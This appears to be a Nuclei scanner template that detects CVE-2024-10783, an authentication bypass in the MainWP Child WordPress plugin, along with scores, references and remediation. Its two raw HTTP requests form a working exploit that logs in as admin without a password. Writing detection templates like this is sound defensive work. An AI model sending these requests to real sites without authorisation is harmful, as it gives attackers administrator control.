flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: header
    type: word
    words:
    - wordpress_logged_in
  - internal: true
    part: body
    type: word
    words:
    - <mainwp>
  matchers-condition: and
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    function=register&user={{username}}&pubkey=

    '
- matchers:
  - part: body
    type: word
    words:
    - Howdy, {{username}}
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /wp-admin/index.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-10783
info:
  author: Sean Murphy,iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-10783
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-862
    epss-percentile: 0.95739
    epss-score: 0.23135
  description: 'The plugin is vulnerable to an authentication bypass that allows an
    unauthenticated user to login as an administrator without providing a password.
    This vulnerability is only exploitable when the plugin has not been connected
    to a MainWP Dashboard and the "Require unique security ID" option is not enabled
    (it is disabled by default).

    '
  impact: 'Unauthenticated attackers can bypass authentication to gain administrator
    access when the plugin is not connected to MainWP Dashboard and unique security
    ID is not enabled.

    '
  metadata:
    max-request: 2
    publicwww-query: /wp-content/plugins/mainwp-child/
    verified: true
  name: WordPress Plugin MainWP Child - Authentication Bypass
  reference:
  - https://wpscan.com/vulnerability/1898d4f4-1874-4d00-8930-15774d57c9ed/
  - https://plugins.trac.wordpress.org/browser/mainwp-child/tags/5.2/class/class-mainwp-child.php#L76
  - https://plugins.trac.wordpress.org/browser/mainwp-child/tags/5.2/class/class-mainwp-connect.php#L69
  - https://plugins.trac.wordpress.org/browser/mainwp-child/tags/5.2/class/class-mainwp-connect.php#L788
  - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3197586%40mainwp-child&new=3197586%40mainwp-child&sfp_email=&sfph_mail=
  remediation: 'Update MainWP Child plugin to a version newer than 5.2.

    '
  severity: high
  tags: cve,cve2024,wp,mainwp-child,wpscan,wordpress,wp-plugin,auth-bypass,vuln
variables:
  username: admin
